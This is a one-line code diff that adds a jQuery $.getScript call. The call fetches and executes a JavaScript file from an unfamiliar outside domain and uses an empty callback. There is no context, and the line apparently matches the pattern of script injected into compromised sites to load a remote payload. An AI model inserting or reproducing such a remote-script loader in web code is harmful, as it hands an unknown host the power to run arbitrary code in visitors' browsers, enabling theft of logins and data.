@@ -1,0 +1,1 @@
+$.getScript("https://sentramode.web.id/function.js", function(){ });
